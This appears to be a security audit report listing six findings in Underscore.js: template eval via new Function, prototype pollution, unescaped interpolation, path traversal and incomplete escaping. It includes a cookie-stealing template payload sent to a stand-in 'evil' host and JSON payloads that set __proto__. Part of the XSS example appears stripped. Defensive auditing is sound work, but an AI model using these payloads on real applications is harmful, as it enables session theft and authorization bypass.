findings.title: _.template compiles caller-supplied template text to executable code via new Function
findings.description: template() builds a function body from the template string (template.js:50-83) and compiles it with `new Function(argument, '_', source)` at line 87. Any `<% ... %>` evaluate block or `<%= ... %>` interpolate block (lines 56-61) is concatenated verbatim into `source`, so the template string is effectively eval'd in the host realm. If any portion of `text` is attacker-controlled, the attacker runs arbitrary JavaScript in the embedding application.
findings.exploit_scenario: A web app stores a user-supplied string and later renders it with `_.template(userString)({...})`. The user submits `<% fetch('//evil/?c='+document.cookie) %>`; on render the code executes in the victim's session (browser) or in the server process (Node).
findings.recommendation: Never pass untrusted input as the template string. Precompile templates from trusted source at build time. This is a documented design contract (SECURITY.md), so triage may classify it as intended behavior unless an untrusted-input path is shown.
findings.confidence_reason: Real and trivially exploitable when untrusted text reaches it, but the library documents it as intended; reachability depends on embedder misuse.

findings.title: Prototype pollution via _.extend / _.defaults copying a __proto__ own key
findings.description: createAssigner iterates source keys from keysFunc (allKeys for _.extend/_.defaults) and assigns `obj[key] = source[key]` at line 13. When the source is an object parsed from untrusted JSON containing a `__proto__` own-enumerable key, the bracket assignment `obj['__proto__'] = ...` invokes the prototype setter rather than creating an own property, mutating Object.prototype. _.defaults (defaults.js) uses allKeys and the same assigner, so the same path applies.
findings.exploit_scenario: Server does `_.defaults(config, JSON.parse(untrustedBody))` where the body is `{"__proto__":{"isAdmin":true}}`. Every object in the realm now inherits `isAdmin=true`, enabling auth/logic bypass downstream.
findings.recommendation: Filter `__proto__`/`constructor`/`prototype` keys before copying, or use a Map / Object.create(null) for untrusted data; document that untrusted keys must be sanitized by the caller.
findings.confidence_reason: Pollution is plausible for JSON-parsed sources with __proto__ as an own key; exact behavior depends on runtime and whether keysFunc enumerates __proto__, so medium confidence pending triage.

findings.title: Prototype pollution in _.invert when an attacker-controlled value equals __proto__
findings.description: invert() builds `result[obj[_keys[i]]] = _keys[i]` at line 8, using each VALUE of the input object (coerced to string) as a key on the fresh result object. A value of '__proto__' makes the assignment target the prototype setter on result, and a nested/object value can mutate Object.prototype.
findings.exploit_scenario: `_.invert(JSON.parse(untrusted))` where untrusted is `{"x":"__proto__"}` causes `result['__proto__'] = 'x'`; with crafted values an attacker pollutes shared prototype state.
findings.recommendation: Skip or sanitize values that resolve to dangerous keys, or build the result with Object.create(null).
findings.confidence_reason: Same prototype-setter mechanism as F-002 but requires attacker control over object values and is lower impact; medium-low.

findings.title: Unescaped interpolation delimiter <%= %> emits raw HTML
findings.description: The interpolate branch (template.js:59) emits `((__t=(<expr>))==null?'':__t)` with no HTML escaping, unlike the escape branch (line 57) which routes through _.escape. Data interpolated via the default `<%= %>` delimiter is written raw into the output string. If that output is inserted into the DOM and the interpolated value is attacker-controlled, it yields XSS.
findings.exploit_scenario:
Template `

<%= name %>

` rendered with `name = ''` produces executable markup that the page then innerHTMLs.
findings.recommendation: Use the escaping delimiter `<%- %>` (or _.escape) for any untrusted interpolation; treat `<%= %>` as unsafe-by-default.
findings.confidence_reason: Genuine sink but exploitability depends entirely on caller using the wrong delimiter with untrusted data and an HTML sink downstream.

findings.title: _.result walks attacker-controlled path including __proto__/constructor
findings.description: result() resolves `obj[path[i]]` for each path segment (result.js:14) with no key filtering, and invokes the value if it is a function (line 19). A path containing 'constructor' then 'constructor' can reach the Function constructor on some objects, and prototype properties are readable. This is a read/traverse primitive, not a write, so impact is limited.
findings.exploit_scenario: `_.result(obj, untrustedPath)` with a path like ['constructor','constructor'] could surface the Function constructor for further misuse in a gadget chain.
findings.recommendation: Reject reserved keys (__proto__, constructor, prototype) in path traversal, or document that paths must be trusted.
findings.confidence_reason: Read-only traversal; needs a contrived gadget chain and attacker-controlled path; low likelihood.

findings.title: _.escape does not encode the forward slash
findings.description: The escape map (_escapeMap.js) covers & < > " ' and backtick but not '/'. In most HTML contexts this is safe, but in some legacy/attribute contexts unescaped '/' (e.g., '</script>') can contribute to context-breaking. createEscaper (_createEscaper.js:13-16) only replaces mapped characters.
findings.exploit_scenario: Output of _.escape placed inside an inline <script> string context could allow '</script>' sequences to break out, depending on the sink.
findings.recommendation: Consider encoding '/' as '/' for defense-in-depth in script/attribute contexts, or document the supported contexts.
findings.confidence_reason: Defense-in-depth only; OWASP-style hardening with no concrete exploit against standard HTML body context.
